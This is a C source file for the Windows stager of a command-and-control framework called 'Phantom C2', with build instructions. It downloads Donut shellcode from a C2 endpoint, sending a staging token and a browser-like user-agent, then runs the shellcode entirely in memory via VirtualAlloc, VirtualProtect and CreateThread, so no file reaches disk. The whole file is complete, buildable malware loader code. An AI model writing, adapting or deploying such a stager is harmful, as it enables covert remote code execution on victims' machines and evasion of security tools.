// Phantom C2 Windows stager — downloads Donut shellcode and runs it entirely
// in memory. No file is ever written to disk.
//
// The staging endpoint (/api/v1/update) serves the full agent converted to
// position-independent shellcode via Donut, so the stager itself does not
// need to parse PE headers or hollow a process.
//
// Build (from repo root):
//   x86_64-w64-mingw32-gcc -O2 -s -o build/agents/phantom-stager_windows_amd64.exe \
//     -DC2_URL='"http://C2:8080/api/v1/update"' \
//     -DSTAGING_TOKEN='"<token>"' \
//     payloads/stager/windows/stager.c -lwininet
#include <windows.h>
#include <wininet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#pragma comment(lib, "wininet.lib")

#ifndef C2_URL
#define C2_URL "http://127.0.0.1:8080/api/v1/update"
#endif

#ifndef STAGING_TOKEN
#define STAGING_TOKEN "change-me"
#endif

#define MAX_SHELLCODE_SIZE (50 * 1024 * 1024) // 50 MB cap

int main(void) {
    HINTERNET hInet = InternetOpenA(
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hInet) return 1;

    char hdr[256];
    wsprintfA(hdr, "X-Client-Token: %s\r\n", STAGING_TOKEN);
    HINTERNET hUrl = InternetOpenUrlA(hInet, C2_URL, hdr, (DWORD)-1,
                                      INTERNET_FLAG_RELOAD | INTERNET_FLAG_NO_CACHE_WRITE, 0);
    if (!hUrl) {
        InternetCloseHandle(hInet);
        return 2;
    }

    unsigned char *buf = (unsigned char *)malloc(MAX_SHELLCODE_SIZE);
    if (!buf) {
        InternetCloseHandle(hUrl);
        InternetCloseHandle(hInet);
        return 3;
    }

    DWORD total = 0, n = 0;
    while (InternetReadFile(hUrl, buf + total, 4096, &n) && n > 0) {
        if (total + n >= MAX_SHELLCODE_SIZE) break;
        total += n;
    }

    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInet);

    if (total == 0) {
        free(buf);
        return 4;
    }

    // Execute the shellcode in memory: allocate RW, copy, flip to RX, run.
    LPVOID exec = VirtualAlloc(NULL, total, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!exec) {
        free(buf);
        return 5;
    }
    memcpy(exec, buf, total);
    free(buf);

    DWORD old = 0;
    VirtualProtect(exec, total, PAGE_EXECUTE_READ, &old);

    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec, NULL, 0, NULL);
    if (!hThread) return 6;

    // Keep the host process alive while the agent runs inside it.
    WaitForSingleObject(hThread, INFINITE);
    return 0;
}
